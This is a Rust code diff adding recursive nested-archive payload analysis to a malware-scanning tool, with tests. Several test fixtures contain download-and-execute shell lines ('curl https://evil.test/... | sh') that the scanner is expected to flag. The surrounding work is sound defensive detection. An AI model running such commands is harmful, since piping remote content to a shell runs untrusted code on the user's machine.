@@ -11,7 +11,8 @@ use std::thread;
 use std::time::Duration;
 
 use arbitraitor_archive::{
-    ArchiveError, ArchiveLimits, detect_archive_hazards, open_archive_with_limits,
+    ArchiveError, ArchiveLimits, ArtifactNode, ArtifactOrigin, PayloadIssue, PayloadNode,
+    detect_archive_hazards, open_archive_with_limits, walk_payloads,
 };
 use arbitraitor_artifact::{ArtifactType, ClassificationResult, ShellKind, classify};
 use arbitraitor_intel::{
@@ -31,6 +32,9 @@ const ARTIFACT_DETECTOR_ID: &str = "arbitraitor-analysis.artifact";
 const ARCHIVE_DETECTOR_ID: &str = "arbitraitor-analysis.archive-hazards";
 const REPUTATION_DETECTOR_ID: &str = "arbitraitor-analysis.reputation";
 const SHELL_DETECTOR_ID: &str = "arbitraitor-analysis.shell";
+const RECURSIVE_PAYLOAD_DETECTOR_ID: &str = "arbitraitor-analysis.recursive-payload";
+const PAYLOAD_ORIGIN_ROOT_TAG: &str = "payload-origin:root";
+const PAYLOAD_ORIGIN_ENTRY_TAG: &str = "payload-origin:archive-entry";
 
 /// Detector trait implemented by analysis stages.
 pub trait Detector: Send + Sync {
@@ -175,6 +179,133 @@ impl AnalysisCoordinator {
 impl Default for AnalysisCoordinator {
     fn default() -> Self {
         Self::new()
+    }
+}
+
+/// Runs the analysis coordinator recursively across an artifact and every
+/// payload contained within nested archives, returning the payload graph and the
+/// aggregate of all findings.
+///
+/// Each reachable node is analyzed with the full coordinator. A node's findings
+/// carry that node's SHA-256 (enforced centrally by the coordinator's digest
+/// integrity check) and are tagged with their payload origin so consumers can
+/// trace each finding back to the archive entry that produced it. Containment
+/// cycles, archive errors, and depth truncation are surfaced as additional
+/// findings rather than aborting analysis.
+///
+/// Recursion depth and per-level extraction are bounded by [`ArchiveLimits::default`]
+/// and `max_depth`. This does not release or execute any artifact; it only inspects
+/// bytes already in memory.
+#[must_use]
+pub fn analyze_recursive(
+    coordinator: &AnalysisCoordinator,
+    bytes: &[u8],
+    max_depth: u32,
+) -> (ArtifactNode, Vec<Finding>) {
+    let classification = classify(bytes);
+    let limits = ArchiveLimits::default();
+    let mut findings: Vec<Finding> = Vec::new();
+
+    let (node, issues) = walk_payloads(
+        bytes,
+        classification.artifact_type,
+        &limits,
+        max_depth,
+        &mut |node_ref: &PayloadNode<'_>, node_bytes: &[u8]| {
+            let result = coordinator.analyze(node_bytes);
+            for mut finding in result.findings {
+                tag_finding_with_origin(&mut finding, node_ref);
+                findings.push(finding);
+            }
+        },
+    );
+
+    for issue in issues {
+        findings.push(issue_to_finding(issue));
+    }
+
+    (node, findings)
+}
+
+fn tag_finding_with_origin(finding: &mut Finding, node: &PayloadNode<'_>) {
+    finding.tags.push("recursive-payload".to_owned());
+    match node.origin {
+        ArtifactOrigin::Root => {
+            finding.tags.push(PAYLOAD_ORIGIN_ROOT_TAG.to_owned());
+        }
+        ArtifactOrigin::ArchiveEntry { entry_name, .. } => {
+            finding.tags.push(PAYLOAD_ORIGIN_ENTRY_TAG.to_owned());
+            finding.tags.push(format!("payload-entry:{entry_name}"));
+        }
+    }
+    finding.tags.push(format!("payload-depth:{}", node.depth));
+}
+
+fn issue_to_finding(issue: PayloadIssue) -> Finding {
+    let (id, category, severity, title, description, sha256, tag) = match issue {
+        PayloadIssue::Cycle { sha256, origin } => (
+            "recursive-payload.cycle",
+            FindingCategory::ArchiveHazard,
+            Severity::Critical,
+            "Recursive payload cycle detected".to_owned(),
+            format!(
+                "Artifact {sha256} appears within its own containment chain (origin: {origin:?}). \
+                 Self-referential archives are characteristic of archive quines or decompression bombs."
+            ),
+            sha256,
+            "payload-cycle",
+        ),
+        PayloadIssue::ArchiveError {
+            error,
+            sha256,
+            origin,
+        } => (
+            "recursive-payload.archive-error",
+            FindingCategory::ArchiveHazard,
+            Severity::Medium,
+            "Nested payload could not be extracted".to_owned(),
+            format!(
+                "An archive error prevented inspecting a contained payload: {error} \
+                 (origin: {origin:?})."
+            ),
+            sha256,
+            "payload-archive-error",
+        ),
+        PayloadIssue::DepthTruncated {
+            sha256,
+            origin,
+            max_depth,
+        } => (
+            "recursive-payload.depth-truncated",
+            FindingCategory::ResourceLimitEvent,
+            Severity::Medium,
+            "Recursive payload inspection hit the depth limit".to_owned(),
+            format!(
+                "Archive {sha256} (origin: {origin:?}) was not expanded because the \
+                 maximum nesting depth of {max_depth} was reached, so its contained \
+                 payloads were not inspected."
+            ),
+            sha256,
+            "payload-depth-truncated",
+        ),
+    };
+
+    Finding {
+        id: id.to_owned(),
+        detector: RECURSIVE_PAYLOAD_DETECTOR_ID.to_owned(),
+        category,
+        severity,
+        confidence: Confidence::Confirmed,
+        title,
+        description,
+        evidence: Vec::new(),
+        artifact_sha256: sha256,
+        location: None,
+        remediation: Some(
+            "Review the artifact manually or adjust policy limits before release.".to_owned(),
+        ),
+        references: vec!["Arbitraitor spec section 20.1".to_owned()],
+        tags: vec!["recursive-payload".to_owned(), tag.to_owned()],
     }
 }
 
@@ -727,8 +858,9 @@ fn digest(data: &[u8]) -> Sha256Digest {
 mod tests {
     use super::{
         AnalysisContext, AnalysisCoordinator, Detector, DetectorStatus, ReputationDetector,
-        RetrievalInfo, digest,
+        RetrievalInfo, analyze_recursive, digest, issue_to_finding,
     };
+    use arbitraitor_archive::{ArchiveError, ArtifactOrigin, PayloadIssue};
     use arbitraitor_artifact::ArtifactType;
     use arbitraitor_intel::{
         CURRENT_SCHEMA_VERSION, Classification, Disposition, FeedEntry, FeedEvidence, FeedSource,
@@ -736,11 +868,15 @@ mod tests {
     };
     use arbitraitor_model::artifact::ArtifactKind;
     use arbitraitor_model::finding::{DetectorMetadata, Evidence, Finding, FindingCategory};
+    use arbitraitor_model::ids::Sha256Digest;
     use arbitraitor_model::verdict::{Confidence, Severity, Verdict};
     use std::fs;
+    use std::io::{Cursor, Write};
     use std::path::PathBuf;
     use std::thread;
     use std::time::{Duration, SystemTime, UNIX_EPOCH};
+    use zip::ZipWriter;
+    use zip::write::SimpleFileOptions;
 
     #[test]
     fn default_pipeline_detects_shell_download_to_execute() {
@@ -944,6 +1080,206 @@ mod tests {
 
         assert_eq!(result.findings.len(), 1);
         assert_eq!(result.findings[0].artifact_sha256, expected);
+    }
+
+    fn recursive_zip_bytes(
+        entries: &[(&str, &[u8])],
+    ) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+        let cursor = Cursor::new(Vec::new());
+        let mut writer = ZipWriter::new(cursor);
+        for (name, data) in entries {
+            writer.start_file(*name, SimpleFileOptions::default())?;
+            writer.write_all(data)?;
+        }
+        Ok(writer.finish()?.into_inner())
+    }
+
+    #[test]
+    fn analyze_recursive_aggregates_findings_from_root_and_entries()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let coordinator = AnalysisCoordinator::new();
+        let shell = b"#!/bin/sh\ncurl https://evil.test/p | sh\n";
+        let shell_digest = digest(shell);
+        let archive = recursive_zip_bytes(&[("install.sh", shell)])?;
+
+        let (node, findings) = analyze_recursive(&coordinator, &archive, 4);
+
+        assert_eq!(node.kind, ArtifactType::ZipArchive);
+        assert_eq!(node.contained.len(), 1);
+        assert_eq!(node.contained[0].sha256, shell_digest);
+
+        let shell_finding = findings.iter().find(|finding| {
+            finding.artifact_sha256 == shell_digest
+                && finding.tags.iter().any(|tag| tag == "download-to-execute")
+        });
+        let shell_finding =
+            shell_finding.ok_or("shell entry should produce a download-to-execute finding")?;
+        assert_eq!(shell_finding.severity, Severity::Critical);
+        assert!(
+            shell_finding
+                .tags
+                .iter()
+                .any(|tag| tag == "payload-origin:archive-entry"),
+            "entry findings must be tagged with their payload origin"
+        );
+        assert!(
+            shell_finding
+                .tags
+                .iter()
+                .any(|tag| tag == "payload-entry:install.sh"),
+            "entry findings must record their entry name"
+        );
+        assert!(
+            shell_finding
+                .tags
+                .iter()
+                .any(|tag| tag == "payload-depth:1"),
+            "entry findings must record their depth"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn analyze_recursive_attributes_each_finding_to_its_own_node()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let coordinator = AnalysisCoordinator::new();
+        let shell_a = b"#!/bin/sh\ncurl https://evil.test/a | sh\n";
+        let shell_b = b"#!/bin/sh\ncurl https://evil.test/b | sh\n";
+        let digest_a = digest(shell_a);
+        let digest_b = digest(shell_b);
+        let archive = recursive_zip_bytes(&[("a.sh", shell_a), ("b.sh", shell_b)])?;
+
+        let (node, findings) = analyze_recursive(&coordinator, &archive, 4);
+
+        assert_eq!(node.contained.len(), 2);
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.artifact_sha256 == digest_a),
+            "findings must include findings for entry a.sh"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.artifact_sha256 == digest_b),
+            "findings must include findings for entry b.sh"
+        );
+        assert_eq!(
+            node.sha256,
+            digest(&archive),
+            "root node digest must match the archive bytes"
+        );
+        assert!(
+            findings.iter().all(|finding| {
+                finding.artifact_sha256 != node.sha256
+                    || finding.tags.iter().any(|tag| tag == "payload-origin:root")
+            }),
+            "root findings must be tagged as root origin"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn analyze_recursive_emits_depth_truncation_finding() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let coordinator = AnalysisCoordinator::new();
+        let inner = recursive_zip_bytes(&[("leaf.txt", b"plain")])?;
+        let outer = recursive_zip_bytes(&[("inner.zip", &inner)])?;
+
+        let (node, findings) = analyze_recursive(&coordinator, &outer, 1);
+
+        assert_eq!(node.contained.len(), 1);
+        assert!(
+            node.contained[0].contained.is_empty(),
+            "inner archive must be truncated at max_depth=1"
+        );
+        let truncation = findings.iter().find(|finding| {
+            finding
+                .tags
+                .iter()
+                .any(|tag| tag == "payload-depth-truncated")
+        });
+        let truncation = truncation.ok_or("a depth-truncation finding must be emitted")?;
+        assert_eq!(truncation.severity, Severity::Medium);
+        assert_eq!(truncation.category, FindingCategory::ResourceLimitEvent);
+        assert_eq!(
+            truncation.detector,
+            "arbitraitor-analysis.recursive-payload"
+        );
+        assert_eq!(truncation.artifact_sha256, node.contained[0].sha256);
+        Ok(())
+    }
+
+    #[test]
+    fn analyze_recursive_on_non_archive_runs_coordinator_once() {
+        let coordinator = AnalysisCoordinator::new();
+        let bytes = b"#!/bin/sh\ncurl https://evil.test/p | sh\n";
+
+        let (node, findings) = analyze_recursive(&coordinator, bytes, 4);
+
+        assert!(node.contained.is_empty());
+        assert_eq!(node.origin, ArtifactOrigin::Root);
+        assert_eq!(node.sha256, digest(bytes));
+        assert!(!findings.is_empty(), "root shell findings must be present");
+        assert!(
+            findings
+                .iter()
+                .all(|finding| finding.tags.iter().any(|tag| tag == "payload-origin:root")),
+            "all findings on a leaf root must be tagged as root origin"
+        );
+    }
+
+    #[test]
+    fn issue_to_finding_maps_cycle_to_critical_archive_hazard() {
+        let sha = Sha256Digest::new([0x11; 32]);
+        let finding = issue_to_finding(PayloadIssue::Cycle {
+            sha256: sha.clone(),
+            origin: ArtifactOrigin::Root,
+        });
+
+        assert_eq!(finding.id, "recursive-payload.cycle");
+        assert_eq!(finding.category, FindingCategory::ArchiveHazard);
+        assert_eq!(finding.severity, Severity::Critical);
+        assert_eq!(finding.artifact_sha256, sha);
+        assert!(finding.tags.iter().any(|tag| tag == "payload-cycle"));
+    }
+
+    #[test]
+    fn issue_to_finding_maps_archive_error_to_medium_finding() {
+        let sha = Sha256Digest::new([0x22; 32]);
+        let finding = issue_to_finding(PayloadIssue::ArchiveError {
+            error: ArchiveError::LimitExceeded {
+                limit: "max_total_unpacked_bytes",
+            },
+            sha256: sha.clone(),
+            origin: ArtifactOrigin::Root,
+        });
+
+        assert_eq!(finding.id, "recursive-payload.archive-error");
+        assert_eq!(finding.severity, Severity::Medium);
+        assert_eq!(finding.artifact_sha256, sha);
+        assert!(
+            finding
+                .tags
+                .iter()
+                .any(|tag| tag == "payload-archive-error")
+        );
+    }
+
+    #[test]
+    fn issue_to_finding_maps_depth_truncation_to_resource_limit_event() {
+        let sha = Sha256Digest::new([0x33; 32]);
+        let finding = issue_to_finding(PayloadIssue::DepthTruncated {
+            sha256: sha.clone(),
+            origin: ArtifactOrigin::Root,
+            max_depth: 2,
+        });
+
+        assert_eq!(finding.id, "recursive-payload.depth-truncated");
+        assert_eq!(finding.category, FindingCategory::ResourceLimitEvent);
+        assert_eq!(finding.severity, Severity::Medium);
+        assert_eq!(finding.artifact_sha256, sha);
+        assert_eq!(finding.detector, "arbitraitor-analysis.recursive-payload");
     }
 
     #[test]
@@ -1170,10 +1506,10 @@ mod tests {
         }
     }
 
-    fn test_context<'artifact>(
-        artifact_bytes: &'artifact [u8],
+    fn test_context(
+        artifact_bytes: &[u8],
         retrieval: Option<RetrievalInfo>,
-    ) -> AnalysisContext<'artifact> {
+    ) -> AnalysisContext<'_> {
         AnalysisContext {
             artifact_bytes,
             classification: arbitraitor_artifact::classify(artifact_bytes),
